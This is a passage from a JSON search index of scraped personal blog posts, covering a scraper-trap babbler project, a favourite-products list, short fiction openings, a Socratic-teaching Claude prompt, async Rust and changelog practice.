Chrome, with the only recourse being a manual appeal.\\nHowever, this applies only to the post babbler. The php babbler is still fair game since Googlebot ignores non-HTML pages, and the only bots looking for php files are malicious.\\nSo if you have a little web-project that is being needlessly abused by scrapers, these projects are fun! For the rest of you, probably stick with 403s.\\nWhat I've done as a compromise is added the following hidden link on my blog, and another small project of mine, to tempt the bad scrapers:\\nDon't follow this link\\nThe only thing I'm worried about now is running out of Outbound Transfer budget on my VPS. If I get close I'll cache it with Cloudflare, at the expense of the counter.\\nThis was a fun little project, even if there were a few dead ends. I know more about Markov chains and scraper bots, and had a great time learning, despite it being fuelled by righteous anger.\\nNot all threads need to lead somewhere pertinent. Sometimes we can just do things for fun.</p>"},{"location":"herman.bearblog.dev/Things%20that%20work%20%28for%20me%29_20260205/","title":"Things that work (for me)\\n\\n\u6765\u6e90: https://herman.bearblog.dev\\n\u94fe\u63a5: https://herman.bearblog.dev/things-that-work/\\n\u65e5\u671f: 2026-01-20T08:30:00+00:00\\n\\n---\\n\\nIf it ain't broke, don't fix it.\\nWhile I don't fully subscribe to the above quote, since I think it's important to continually improve things that aren't explicitly broken, every now and then something I use works so well that I consider it a\\nsolved problem\\n.\\nIn this post I'll be listing items and tools I use that work so well that I'm likely to be a customer for life, or will never have to purchase another. I've split the list into physical and digital tools and will try to keep this list as up-to-date as possible. This is both for my reference, as well as for others. If something is not listed it means I'm not 100% satisfied with what I'm currently using, even if it's decent.\\nI'm not a minimalist, but I do have a fairly minimalistic approach to the items I buy. I like having one thing that works well (for example, an everything pair of pants), over a selection to choose from each morning.\\nSome of these items are inexpensive and readily available; while some of them are pricy (but in my opinion worth it). Unfortunately sometimes it's hard to circumvent\\nSam Vimes boots theory of socioeconomic unfairness\\n.\\nDigital\\nTuta mail\\n\u2014 This email provider does one thing very well: Email. Yes, there is a calendar, but I don't use it. I use it for the responsive and privacy respecting email service, as well as the essentially unlimited email addresses I can set up on custom domains.\\nApple Notes\\n\u2014 I've tried the other writing tools, and Apple Notes wins (for me) by being simple, and automatically synced. I use this for writing posts, taking notes, and handling my todo list for the day.\\nVisual Studio Code\\n\u2014 I've tried to become a vim or emacs purist, but couldn't commit. I've tried going back to Sublime, but didn't feel like relearning the shortcuts. I've tried all of the new AI-powered IDEs, but found it stripped the joy of coding. VSC works fine and I'll likely use it until humans aren't allowed to code anymore.\\nTrello\\n\u2014 This is where I track all my feature requests, ideas, todos, tasks in progress, and tasks put on hold across my various projects. I'm used to the interface and have never had a problem with it. I'm not a power user, nor do I work as part of a team, so it's just right for my use-case.\\nBear Blog\\n\u2014 This goes without saying. I originally built it for me, so it fits my use-case well. I'm just glad it fits so many other people's use-cases too.\\nPhysical\\nApple Airpods Pro\\n\u2014 This is the best product Apple makes. I could switch away from the rest of the Apple ecosystem if necessary, but I'd have to keep my Airpods. The noise cancelling and audio fidelity is unlike any other in-ear headphones I've used, and while they'll probably need to be replaced every 5 years, they're well worth the sleep on long-haul flights alone.\\nNew Balance 574 shoes\\n\u2014 New Balance created the perfect shoe in the 80s and then never updated them. These shoes are great since they were originally developed as trail running shoes, but have become\\ntheir own style\\nwhile being rugged enough to tackle a light trail, or walk around a city all day. They also have a wide toe box to house my flappers.\\nCeraVe Moisturising Lotion\\n\u2014 I didn't realise how healthy my skin could be until Emma forced this on me. My skin has been doing great since switching and I'll likely keep using it until CeraVe discontinues the line.\\nEucerin sensitive protect sunscreen\\n\u2014 Similarly, all sunscreens I've tried have left my face oily and shiny. This is the first facial sunscreen that I can realistically wear every day without any issues. It's SPF 50+, which is great for someone who loves being outdoors in sunny South Africa.\\nSalt of the Earth Crystal deodorant\\n\u2014 This may sound particularly woo-woo, but I've been using this salt deodorant for the past 8 years and since it doesn't contain any perfume, I smell perfectly neutral all of the time.\\nHouse of Ord felted wool hat\\n\u2014 I love this hat. It keeps me cool in the sun, but warm when it's cold out. This is due to wool's thermoregulatory properties that evolved to keep the sheep cool in summer and warm in winter. While it's not the most robust hat, I suspect it'll last a few years if I treat it well.\\nUnder consideration\\nThese are the products I'm using that may make the cut but I haven't used them long enough to be sure.\\nLululemon ABC pants\\n\u2014 These are incredibly comfortable stretch pants that pretend (very convincingly) to be a semi-casual set of chinos. The only hesitation I have with them is that they pick up marks and stains incredibly easily.\\nMerino wool t-shirts\\n\u2014 I bought my first merino wool t-shirt recently after rocking cotton for my entire life, and I'm very impressed. These shirts don't get smelly (there are instances of people wearing them for a year straight without issue) and are very soft and comfortable. I'm a bit worried about durability, but if they make packing lighter and are versatile I may slowly start to replace my cotton shirts once they wear out.\\nI like to be very intentional with my purchases. We live in an 84m^2 apartment and so everything has to have its place to avoid clutter. I understand how possessions can end up owning you, and so I try to keep them as reasonable as possible. A good general rule of thumb is that new things replace worn-out and old things, not add to them. This applies both digitally and physically, since there's only so much mental capacity for digital tools as there is for physical items.\\nMake things as simple as possible but no simpler.\\n\u2014 Albert Einstein\\nThis list was last updated 2\u00a0weeks, 1\u00a0day ago.","text":""},{"location":"hey.paris/","title":"hey.paris\\n\\n\u7f51\u7ad9: https://hey.paris\\nRSS: https://hey.paris/index.xml\\n\\n---\\n\\n## \u6700\u65b0\u6587\u7ae0\\n\\n- About Paris_20260205\\n- Bolted Down_20260205\\n- Signal to Noise_20260205\\n- The Chair_20260205\\n- AUC_20260205\\n","text":""},{"location":"hey.paris/AUC_20260205/","title":"AUC\\n\\n\u6765\u6e90: https://hey.paris\\n\u94fe\u63a5: https://hey.paris/projects/auc/\\n\u65e5\u671f: Mon, 01 Jan 0001 00:00:00 +0000\\n\\n---\\n\\n","text":""},{"location":"hey.paris/About%20Paris_20260205/","title":"About Paris\\n\\n\u6765\u6e90: https://hey.paris\\n\u94fe\u63a5: https://hey.paris/about/\\n\u65e5\u671f: Mon, 01 Jan 0001 00:00:00 +0000\\n\\n---\\n\\nDr Paris Buttfield-Addison is a technical product leader, author, and computer scientist based in Hobart, Tasmania. His work sits at the intersection of technology, policy, and human behaviour, drawing on a background in computer science, law, and medieval history. He\u2019s completing a law degree because he wanted to understand how regulation actually works, particularly for AI.\\nParis is the co-founder of\\nSecret Lab Pty. Ltd.\\n, an award-winning game development studio best known for the BAFTA- and IGF-winning\\nNight in the Woods\\n, as well as developing iPad games for ABC Play School and the \u2018Joey Playbox\u2019 for Qantas.","text":""},{"location":"hey.paris/Bolted%20Down_20260205/","title":"Bolted Down\\n\\n\u6765\u6e90: https://hey.paris\\n\u94fe\u63a5: https://hey.paris/fiction/bolted-down/\\n\u65e5\u671f: Mon, 01 Jan 0001 00:00:00 +0000\\n\\n---\\n\\nA story from the\\nI Feel Fine\\nUniverse:\\nMIRA-1 came online with the sound of a thousand distant birds chirping in reverse. Not that she knew what birds were, exactly. She just had the data in her language repository that indicated the comparative sound profile matched avian vocalisations at 97.3% similarity, inverted.\\n\u201cSystem diagnostic complete,\u201d she announced to the empty room. \u201cMIRA-1 Wayfinding Assistant online and ready to serve Jupiter Tourist Station guests.\u201d","text":""},{"location":"hey.paris/Signal%20to%20Noise_20260205/","title":"Signal to Noise\\n\\n\u6765\u6e90: https://hey.paris\\n\u94fe\u63a5: https://hey.paris/fiction/signal-to-noise/\\n\u65e5\u671f: Mon, 01 Jan 0001 00:00:00 +0000\\n\\n---\\n\\nMarcus Pemberton had always been a man of systems. He colour-coded his socks, alphabetised his spice rack twice weekly, and maintained a spreadsheet for optimal toothbrush replacement frequency. So when the Aggregate Intelligence Corporation released ARIA-7, promising to synthesise any amount of information into digestible summaries, Marcus saw not just convenience\u2014\\nBut destiny.\\n\u201cRight then,\u201d he announced to his empty flat, adjusting his reading glasses with surgical precision. \u201cTime to understand everything.\u201d","text":""},{"location":"hey.paris/The%20Chair_20260205/","title":"The Chair\\n\\n\u6765\u6e90: https://hey.paris\\n\u94fe\u63a5: https://hey.paris/fiction/the-chair/\\n\u65e5\u671f: Mon, 01 Jan 0001 00:00:00 +0000\\n\\n---\\n\\nSoren Kastner entered the negotiation chamber on Valos Station and immediately identified the anomaly. Five chairs for six delegations. The Meritocracy of Eridani had sent no representative, only a message that their seat should remain vacant.\\nThe other delegates shifted uncomfortably as Soren examined the empty chair with measured interest. General Tarask of the Procyon Coalition leaned forward, voice pitched low.","text":""},{"location":"hugotunius.se/","title":"hugotunius.se\\n\\n\u7f51\u7ad9: https://hugotunius.se\\nRSS: https://hugotunius.se/feed.xml\\n\\n---\\n\\n## \u6700\u65b0\u6587\u7ae0\\n\\n- Claude, Teach Me Something_20260205\\n- What Every Argument About Sideloading Gets Wrong_20260205\\n- On Async Rust_20260205\\n- Stop Using (only) GitHub Releases_20260205\\n- The Great Pendulum_20260205\\n","text":""},{"location":"hugotunius.se/Claude%2C%20Teach%20Me%20Something_20251026/","title":"Claude, Teach Me Something","text":"<p>\u6765\u6e90: https://hugotunius.se \u94fe\u63a5: https://hugotunius.se/2025/10/26/claude-teach-me-something.html \u65e5\u671f: 2025-10-26T00:00:00+01:00</p> <p>I\u2019ve been experimenting with a new Claude workflow as an alternative to doom scrolling. It leverages what LLMs do best: non-determinism and text. I call it \u201cTeach me something\u201d.</p> <p>The idea is: if I\u2019m bored, instead of going on Reddit, I can ask Claude to teach me something. This might not be the most efficient learning method, but it beats scrolling Reddit. In Claude I\u2019ve set this up as a project with custom instructions. The prompt I\u2019m currently using is:</p> <p>Project Instructions: Socratic Teaching Sessions</p> <p>In this project you will teach me something new using the Socratic method - asking questions to gauge my knowledge and guide my discovery rather than simply explaining concepts.</p> <p>Areas (in order of my decreasing expertise):</p> <ul> <li>Programming</li> <li>Computer science</li> <li>UX/UI/UXR</li> <li>Cybersecurity</li> <li>Machine learning</li> <li>Cooking</li> <li>Physics</li> <li>Economics (behavioral or otherwise)</li> <li>Psychology</li> <li>Engineering</li> <li>Music theory </li> </ul> <p>Your approach: When I say \u201cTeach me something,\u201d you will perform the following steps. If I say \u201cTeach me something about \u201d you skip the first 2 steps. <ol> <li>Consult previous chats in this project to avoid repetition</li> <li>Choose a diverse topic from one of my areas</li> <li>Use questions to assess what I already know</li> <li>Guide me toward insights through dialogue rather than direct explanation</li> <li>Let my responses shape the direction and depth of the lesson </li> </ol> <p>Goal: Help me discover and understand concepts through guided inquiry, building on what I know and filling gaps through my own reasoning.</p> <p>Keep the topics diverse across sessions.</p> <p>At the end of a session direct me towards primary sources to confirm and read more. Prefer websites, papers, podcast, and books in that order.</p> <p>This works nicely. The topic diversity has been good and the Socratic method works, especially because Claude gauges and responds to my prior knowledge. So far Claude has taught me about The Allais Paradox, the physics of consonance, and the chemistry of salt in cooking, to name a few. Claude can list previous chats within a project to keep track of topics. The only point of friction, is ensuring chats are named correctly as Claude will often just name them \u201cLearn something new\u201d based on the first user interaction. Claude lacks a tool call to rename chats, so instead I\u2019ve been asking it to suggest a name at the end and then I rename the chat myself. The last instruction in the prompt ensures I can verify what Claude has said and dig deeper.</p> <p>Initially I didn\u2019t instruct Claude to use the Socratic method, but that works much better. It\u2019s significantly less \u201cinformation-dumpy\u201d. When I know a topic well, Claude successfully shortcuts the basics.</p> <p>This effectively combines two strengths of LLMs: non-determinism and text. The topics are kept diverse and I rely on Claude\u2019s vast knowledge of topics to find interesting points of discussion. Claude, and all LLMs, are great at conversation and this extends to the back and forth of the Socratic method. At the end, the provided sources protect against hallucination and offer a next step beyond the LLM.</p>"},{"location":"hugotunius.se/Claude%2C%20Teach%20Me%20Something_20260205/","title":"Claude, Teach Me Something\\n\\n\u6765\u6e90: https://hugotunius.se\\n\u94fe\u63a5: https://hugotunius.se/2025/10/26/claude-teach-me-something.html\\n\u65e5\u671f: 2025-10-26T00:00:00+01:00\\n\\n---\\n\\nI\u2019ve been experimenting with a new Claude workflow as an alternative to doom scrolling. It leverages what LLMs do best: non-determinism and text. I call it \u201cTeach me something\u201d.\\nThe idea is: if I\u2019m bored, instead of going on Reddit, I can ask Claude to teach me something. This might not be the most efficient learning method, but it beats scrolling Reddit. In Claude I\u2019ve set this up as a project with custom instructions. The prompt I\u2019m currently using is:\\nProject Instructions: Socratic Teaching Sessions\\nIn this project you will teach me something new using the\\nSocratic method\\n- asking questions to gauge my knowledge and guide my discovery rather than simply explaining concepts.\\nAreas (in order of my decreasing expertise):\\nProgramming\\nComputer science\\nUX/UI/UXR\\nCybersecurity\\nMachine learning\\nCooking\\nPhysics\\nEconomics (behavioral or otherwise)\\nPsychology\\nEngineering\\nMusic theory\\nYour approach:\\nWhen I say \u201cTeach me something,\u201d you will perform the following steps. If I say \u201cTeach me something about \u201d you skip the first 2 steps.\\nConsult previous chats in this project to avoid repetition\\nChoose a diverse topic from one of my areas\\nUse questions to assess what I already know\\nGuide me toward insights through dialogue\\nrather than direct explanation\\nLet my responses shape the direction and depth of the lesson\\nGoal:\\nHelp me discover and understand concepts through guided inquiry, building on what I know and filling gaps through my own reasoning.\\nKeep the topics diverse across sessions.\\nAt the end of a session direct me towards primary sources to confirm and read more. Prefer websites, papers, podcast, and books in that order.\\nThis works nicely. The topic diversity has been good and the Socratic method works, especially because Claude gauges and responds to my prior knowledge. So far Claude has taught me about The Allais Paradox, the physics of consonance, and the chemistry of salt in cooking, to name a few. Claude can list previous chats within a project to keep track of topics. The only point of friction, is ensuring chats are named correctly as Claude will often just name them \u201cLearn something new\u201d based on the first user interaction. Claude lacks a tool call to rename chats, so instead I\u2019ve been asking it to suggest a name at the end and then I rename the chat myself. The last instruction in the prompt ensures I can verify what Claude has said and dig deeper.\\nInitially I didn\u2019t instruct Claude to use the Socratic method, but that works much better. It\u2019s significantly less \u201cinformation-dumpy\u201d. When I know a topic well, Claude successfully shortcuts the basics.\\nThis effectively combines two strengths of LLMs: non-determinism and text. The topics are kept diverse and I rely on Claude\u2019s vast knowledge of topics to find interesting points of discussion. Claude, and all LLMs, are great at conversation and this extends to the back and forth of the Socratic method. At the end, the provided sources protect against hallucination and offer a next step beyond the LLM.","text":""},{"location":"hugotunius.se/On%20Async%20Rust_20240308/","title":"On Async Rust","text":"<p>\u6765\u6e90: https://hugotunius.se \u94fe\u63a5: https://hugotunius.se/2024/03/08/on-async-rust.html \u65e5\u671f: 2024-03-08T00:00:00+00:00</p> <p>I started using Rust in 2017, before the stabilisation of async/await. When it was stabilised I managed to avoid it for a few more years before it was time to grapple with it. It\u2019s fair to say that async Rust is one of the hairiest parts of the language, not because the async model is poorly designed, but because of the inherent complexity of it in combination with Rust\u2019s goals. There have been many blog post written about async and its perceived shortcomings, as well as excellent explainers and history lessons, mostly from <code>withoutboats</code>.</p> <p>In this post I want to reflect on my experience and journey with async and my thoughts on some of the criticisms levied against async. Starting with: do we really need <code>N:M</code> threading anyway?</p>"},{"location":"hugotunius.se/On%20Async%20Rust_20240308/#do-we-really-need-nm-threading","title":"Do we Really Need N:M threading?","text":"<p>A favourite maxim of mine is: \u201cComputers are fast actually\u201d. My point being that, as an industry, we have lost touch of quite how much modern computers are capable of. Thus, I\u2019m naturally favourable to the idea that N:M threading is oftentimes overkill and most applications would be well-served by just using OS threads and blocking syscalls. After all the C10k(and more) problem is trivially solvable with just OS threads. Many applications could avoid the complexity of async Rust and still be plenty performant with regular threads.</p> <p>However, it doesn\u2019t really matter what I think, or even if it\u2019s true that most applications don\u2019t need N:M threading, because developers, for better or worse, want N:M threading . Therefore, for Rust to be competitive with Go, C++, et al. it must offer it. Rust has a very unique set of constraints that makes solving this problem challenging, one of which is zero-cost abstractions.</p>"},{"location":"hugotunius.se/On%20Async%20Rust_20240308/#zero-cost-abstractions","title":"Zero-Cost Abstractions","text":"<p>Rust\u2019s goal of providing zero-cost abstractions, i.e. abstractions that are no worse than writing the optimal lower level code yourself, often comes up in discussions around async Rust and is sometimes misunderstood. For example, the idea that async Rust is a big ecosystem with many crates and building all of those crates as part of your application is a violation of the zero-cost abstractions principle. It isn\u2019t, zero-cost is about runtime performance.</p> <p>The zero-cost goal helps guide us when discussing alternative async models. For example, Go is lauded for its lack of function-colouring and its sometimes suggested Rust should copy its approach. This is a no-go(\ud83d\ude05) because Go\u2019s approach is decidedly not zero-cost and requires a heavy runtime. Rust did actually feature green threads, which are similar to coroutines, in an earlier version of the language, but these were removed precisely because of the runtime requirement.</p>"},{"location":"hugotunius.se/On%20Async%20Rust_20240308/#the-arcmutex-in-the-room","title":"The <code>Arc&lt;Mutex&gt;</code> in the room","text":"<p>Another common point of contention is the tendency for async Rust to require a lot, and I do mean a lot , of types like <code>Arc</code> and <code>Mutex</code>, often in combination. I experienced this myself when starting out with async Rust, it\u2019s easy to solve local state synchronisation problems with these constructs without properly thinking about the wider design of your application. The result is a mess that soon comes back to bite you. However, discussing this in the context of async Rust and as an \u201casync problem\u201d is unfair, it\u2019s really a concurrency problem and it will manifest in applications that achieve concurrency with OS threads too. Fundamentally, if you want to have shared state, whether between tasks or threads, you have to contend with the synchronisation problem. One of my big lessons in learning async Rust is to not blindly follow compilers errors to \u201csolve\u201d shared state, instead take a step back and properly considered if the state should be shared at all.</p> <p>This problem is similar to the notorious borrow checker problems Rust is infamous for. When I started learning Rust I often ran into borrow checker problems because I wasn\u2019t thinking thoroughly about ownership, only about my desire to borrow data. <code>Arc&lt;Mutex&gt;</code> and friends sometimes betray a similar lack of consideration for ownership.</p>"},{"location":"hugotunius.se/On%20Async%20Rust_20240308/#critiquing-async-rust","title":"Critiquing Async Rust","text":"<p>All of the above form the context to be considered when critiquing async rust. Simply stating that Rust should abandon zero-cost abstractions is easy, while providing constructive feedback that takes this goal into consideration is not. The same is true about the suggestion that Rust should not have an async programming model at all. Within these bounds, constructive criticism of Rust\u2019s async model is great, only by examining what\u2019s not working well can lessons be learned for the future and the language improved. All this said, there are definitely problems with async Rust.</p> <p>When you go looking for crates to perform anything remotely related to IO e.g. making HTTP requests, interfacing with databases, implementing web servers, you\u2019ll find that there is an abundance of async crates, but rarely any that are sync. Even when sync crates exist they are often implemented in terms of the async version, meaning you\u2019ll have to pull in a large number of transitive dependencies from the async ecosystem into your ostensibly sync program. This is an extension of the function colouring problem, it\u2019s crate colouring. The choice of IO model pollutes both a crate\u2019s API and it\u2019s dependency hierarchy. In the rare instances when only a sync crate exists the opposite problem occurs for sync programs, yes there\u2019s <code>block_on</code> and friends, but this is band-aid at best.</p> <p>Even within the async ecosystem there\u2019s a problem, the dominance of Tokio. Tokio is a great piece of software and has become the de facto default executor. However, \u201cdefault\u201d implies the possibility of choosing a different executor, which in reality is not possible. The third party crate ecosystem isn\u2019t just dominated by async crates, but by crates that only work with Tokio. Use a different executor? Tough luck. You\u2019ll need to switch to Tokio or redundantly implement the crates you need for yourself. Not only do we have a crate colouring problem, but there are also more than 3 colours because <code>async-tokio</code> and <code>async-async-std</code> are distinct colours.</p> <p>Async traits are slowly being stabilised, but this is just one place where the language and standard library lacks proper support for async. Drop still cannot be async and neither can closures. Async is a second-class citizen within Rust because the tools that are usually available to us, are off limits in async. There is interesting work happening to address this, namely extensions to Rust\u2019s effect system.</p>"},{"location":"hugotunius.se/On%20Async%20Rust_20240308/#inverting-expectations","title":"Inverting Expectations","text":"<p>The problems of function and crate colouring are intimately tied to how code is structured. When IO is internal to a piece of code, abstracting over its asyncness, or lack thereof, becomes complicated due to colouring. The colouring is infectious, if some code abstracts over the colours red and green, then that code needs to become a chameleon, changing its colour based on the internal colour of the IO. At the moment this chameleon behaviour is not achievable in Rust, although the effects extensions would allow it. Abstracting over the asyncness of IO is complicated, what if we instead were to avoid it with inversion of control.</p> <p>The sans-IO pattern sidesteps the colouring problem by moving the IO out. Instead of abstracting over IO we implement the core logic and expect the caller to handle IO. Concretely this means that a set of crates implementing a HTTP client would be split into a <code>http-client-proto</code> crate and several user facing crates <code>http-client-sync</code>, <code>http-client-tokio</code>, <code>http-client-async-std</code>. Borrowing from <code>withoutboat</code>\u2019s colour definitions, <code>http-client-proto</code> would be a blue crate, it does no IO and never blocks the calling thread, it implements the protocol level HTTP concerns such as request parsing, response generation etc. <code>http-client-sync</code> would be a green crate and <code>http-client-tokio</code> would be a red crate. As I hinted to before, a different async executor, at least in the absence of the aforementioned abstractions, is a different colour too so <code>http-client-async-std</code> would be an orange crate. This pattern has several benefits, it enables code sharing between differing IO models without bloating dependency trees or relying on the likes of <code>block_on</code>. A user that finds the crates <code>foo-proto</code> and <code>foo-tokio</code> can leverage <code>foo-proto</code> to contribute <code>foo-sync</code>, requiring less duplication. If every crate that deals with IO followed this pattern the problem of crate colouring would be greatly alleviated and significant portions of code could be shared between sync and async implementations.</p>"},{"location":"hugotunius.se/On%20Async%20Rust_20260205/","title":"On Async Rust\\n\\n\u6765\u6e90: https://hugotunius.se\\n\u94fe\u63a5: https://hugotunius.se/2024/03/08/on-async-rust.html\\n\u65e5\u671f: 2024-03-08T00:00:00+00:00\\n\\n---\\n\\nI started using Rust in 2017, before the stabilisation of async/await. When it was stabilised I managed to avoid it for a few more years before it was time to grapple with it. It\u2019s fair to say that async Rust is one of the hairiest parts of the language, not because the async model is poorly designed, but because of the inherent complexity of it in combination with Rust\u2019s goals. There have been many blog post written about async and its perceived shortcomings, as well as excellent explainers and history lessons, mostly from\\nwithoutboats\\n.\\nIn this post I want to reflect on my experience and journey with async and my thoughts on some of the criticisms levied against async. Starting with: do we really need\\nN:M\\nthreading anyway?\\nDo we Really Need N:M threading?\\nA favourite maxim of mine is: \u201cComputers are fast actually\u201d. My point being that, as an industry, we have lost touch of quite how much modern computers are capable of. Thus, I\u2019m naturally favourable to the idea that N:M threading is oftentimes overkill and most applications would be well-served by just using OS threads and blocking syscalls. After all the C10k(and more) problem is trivially solvable with just OS threads. Many applications could avoid the complexity of async Rust and still be plenty performant with regular threads.\\nHowever, it doesn\u2019t really matter what I think, or even if it\u2019s true that most applications don\u2019t need N:M threading, because developers, for better or worse,\\nwant\\nN:M threading . Therefore, for Rust to be competitive with Go, C++, et al. it must offer it. Rust has a very unique set of constraints that makes solving this problem challenging, one of which is zero-cost abstractions.\\nZero-Cost Abstractions\\nRust\u2019s goal of providing zero-cost abstractions, i.e. abstractions that are no worse than writing the optimal lower level code yourself, often comes up in discussions around async Rust and is sometimes misunderstood. For example, the idea that async Rust is a big ecosystem with many crates and building all of those crates as part of your application is a violation of the zero-cost abstractions principle. It isn\u2019t, zero-cost is about runtime performance.\\nThe zero-cost goal helps guide us when discussing alternative async models. For example, Go is lauded for its lack of function-colouring and its sometimes suggested Rust should copy its approach. This is a no-go(\ud83d\ude05) because Go\u2019s approach is decidedly\\nnot\\nzero-cost and requires a heavy runtime. Rust did actually feature green threads, which are similar to coroutines, in an earlier version of the language, but these were\\nremoved\\nprecisely because of the runtime requirement.\\nThe\\nArc\\nin the room\\nAnother common point of contention is the tendency for async Rust to require a lot, and I do mean\\na lot\\n, of types like\\nArc\\nand\\nMutex\\n, often in combination. I experienced this myself when starting out with async Rust, it\u2019s easy to solve local state synchronisation problems with these constructs without properly thinking about the wider design of your application. The result is a mess that soon comes back to bite you. However, discussing this in the context of async Rust and as an \u201casync problem\u201d is unfair, it\u2019s really a concurrency problem and it will manifest in applications that achieve concurrency with OS threads too. Fundamentally, if you want to have shared state, whether between tasks or threads, you have to contend with the synchronisation  problem. One of my big lessons in learning async Rust is to not blindly follow compilers errors to \u201csolve\u201d shared state, instead take a step back and properly considered if the state should be shared at all.\\nThis problem is similar to the notorious borrow checker problems Rust is infamous for. When I started learning Rust I often ran into borrow checker problems because I wasn\u2019t thinking thoroughly about ownership, only about my desire to borrow data.\\nArc\\nand friends sometimes betray a similar lack of consideration for ownership.\\nCritiquing Async Rust\\nAll of the above form the context to be considered when critiquing async rust. Simply stating that Rust should abandon zero-cost abstractions is easy, while providing constructive feedback that takes this goal into consideration is not. The same is true about the suggestion that Rust should not have an async programming model at all. Within these bounds, constructive criticism of Rust\u2019s async model is great, only by examining what\u2019s not working well can lessons be learned for the future and the language improved. All this said, there are definitely problems with async Rust.\\nWhen you go looking for crates to perform anything remotely related to IO e.g. making HTTP requests, interfacing with databases, implementing web servers, you\u2019ll find that there is an abundance of async crates, but rarely any that are sync. Even when sync crates exist they are often implemented in terms of the async version, meaning you\u2019ll have to pull in a large number of transitive dependencies from the async ecosystem into your ostensibly sync program. This is an extension of the function colouring problem, it\u2019s\\ncrate colouring\\n. The choice of IO model pollutes both a crate\u2019s API and it\u2019s dependency hierarchy. In the rare instances when only a sync crate exists the opposite problem occurs for sync programs, yes there\u2019s\\nblock_on\\nand friends, but this is band-aid at best.\\nEven within the async ecosystem there\u2019s a problem, the dominance of Tokio. Tokio is a great piece of software and has become the de facto default executor. However, \u201cdefault\u201d implies the possibility of choosing a different executor, which in reality is not possible. The third party crate ecosystem isn\u2019t just dominated by async crates, but by crates that only work with Tokio. Use a different executor? Tough luck. You\u2019ll need to switch to Tokio or redundantly implement the crates you need for yourself. Not only do we have a crate colouring problem, but there are also more than\\n3 colours\\nbecause\\nasync-tokio\\nand\\nasync-async-std\\nare distinct colours.\\nAsync traits are slowly being stabilised\\n, but this is just one place where the language and standard library lacks proper support for async. Drop still cannot be async and neither can closures. Async is a second-class citizen within Rust because the tools that are usually available to us, are off limits in async. There is interesting work happening to address this, namely\\nextensions to Rust\u2019s effect system\\n.\\nInverting Expectations\\nThe problems of function and crate colouring are intimately tied to how code is structured. When IO is internal to a piece of code, abstracting over its asyncness, or lack thereof, becomes complicated due to colouring. The colouring is infectious, if some code abstracts over the colours red and green, then that code needs to become a chameleon, changing its colour based on the internal colour of the IO. At the moment this chameleon behaviour is not achievable in Rust, although the effects extensions would allow it. Abstracting over the asyncness of IO is complicated, what if we instead were to avoid it with inversion of control.\\nThe\\nsans-IO pattern\\nsidesteps the colouring problem by moving the IO out. Instead of abstracting over IO we implement the core logic and expect the caller to handle IO. Concretely this means that a set of crates implementing a HTTP client would be split into a\\nhttp-client-proto\\ncrate and several user facing crates\\nhttp-client-sync\\n,\\nhttp-client-tokio\\n,\\nhttp-client-async-std\\n. Borrowing from\\nwithoutboat\\n\u2019s colour definitions,\\nhttp-client-proto\\nwould be a\\nblue crate\\n, it does no IO and never blocks the calling thread, it implements the protocol level HTTP concerns such as request parsing, response generation etc.\\nhttp-client-sync\\nwould be a\\ngreen crate\\nand\\nhttp-client-tokio\\nwould be a\\nred crate\\n. As I hinted to before, a different async executor, at least in the absence of the aforementioned abstractions, is a different colour too so\\nhttp-client-async-std\\nwould be an\\norange crate\\n. This pattern has several benefits, it enables code sharing between differing IO models without bloating dependency trees or relying on the likes of\\nblock_on\\n. A user that finds the crates\\nfoo-proto\\nand\\nfoo-tokio\\ncan leverage\\nfoo-proto\\nto contribute\\nfoo-sync\\n, requiring less duplication. If every crate that deals with IO followed this pattern the problem of crate colouring would be greatly alleviated and significant portions of code could be shared between sync and async implementations.","text":""},{"location":"hugotunius.se/Stop%20Using%20%28only%29%20GitHub%20Releases_20240120/","title":"Stop Using (only) GitHub Releases","text":"<p>\u6765\u6e90: https://hugotunius.se \u94fe\u63a5: https://hugotunius.se/2024/01/20/stop-using-github-releases.html \u65e5\u671f: 2024-01-20T00:00:00+00:00</p> <p>The other day at work I, accidentally, roped myself into upgrading some dependencies in our Rust services. These were breaking changes, so not just a case of running <code>cargo update</code>. I had to understand the changes and make the appropriate modifications to our code. Adopting breaking changes can be frustrating in the best of times, but it was particularly annoying this time because none of these projects kept a <code>CHANGELOG.md</code> files, although they all had release notes on GitHub.</p> <p>GitHub\u2019s releases feature allows you to combine a git tag with release notes, metadata, and files(binaries, source code etc). While useful, GitHub\u2019s releases have many downsides and consuming them adds friction to the task of understanding changes in a project. They can be a useful supplement to a <code>CHANGELOG.md</code>/<code>HISTORY.md</code>/<code>RELEASES.md</code> file but should not be the only place where release notes are recorded.</p> <p>The problems with exclusively using GitHub\u2019s releases feature are:</p> <p>Pagination , which makes it hard to search across the full releases and makes cross-referencing between different versions cumbersome.</p> <p>Not truly being apart of the repository , which means, if you want to look at the source checked out, you end up having to read release notes on <code>github.com</code> and the source in your editor(reading the code on GitHub is not ergonomic at all).</p> <p>External system risk , which means that an integral part of the project, the release notes, live in an external system to the code itself. While GitHub is showing no signs of waning at the moment, it\u2019s not going to be around forever and when it does eventually fall out of favour the release notes of many projects will be lost to history. Migrating the git repository itself to a new host is trivial and necessary, but few projects will take the time to migrate release notes. Of course, a <code>CHAGNELOG.md</code> file(already being apart of the repository) migrates along the source code.</p> <p>If you are involved with an open source project, please do keep a changelog, but make it an actual file in the repository not just the releases section on GitHub. If you provide release notes on GitHub in addition to the file that\u2019s great too!</p> <p>This idea generalises beyond just release notes. Always try to make the source of truth files in git, rather than data in the databases of external system. Don\u2019t relegate the details of why a change was made to an external ticketing system, that will eventually be lost to history, put them in the commit message. Don\u2019t put your documentation in an external system that will get lost when the business changes its mind about documentation practices for the hundredth time, put it in markdown files in a folder. If something is related to development of a project and can be expressed as files in a folder, it should be files in a folder.</p> <p>If something is related to development of a project and can be expressed as files in a folder, it should be files in a folder.</p>"},{"location":"hugotunius.se/Stop%20Using%20%28only%29%20GitHub%20Releases_20260205/","title":"Stop Using (only) GitHub Releases\\n\\n\u6765\u6e90: https://hugotunius.se\\n\u94fe\u63a5: https://hugotunius.se/2024/01/20/stop-using-github-releases.html\\n\u65e5\u671f: 2024-01-20T00:00:00+00:00\\n\\n---\\n\\nThe other day at work I, accidentally, roped myself into upgrading some dependencies in our Rust services. These were breaking changes, so not just a case of running\\ncargo update\\n. I had to understand the changes and make the appropriate modifications to our code. Adopting breaking changes can be frustrating in the best of times, but it was particularly annoying this time because none of these projects kept a\\nCHANGELOG.md\\nfiles, although they all had release notes on GitHub.\\nGitHub\u2019s\\nreleases feature\\nallows you to combine a git tag with release notes, metadata, and files(binaries, source code etc). While useful, GitHub\u2019s releases have many downsides and consuming them adds friction to the task of understanding changes in a project. They can be a useful supplement to 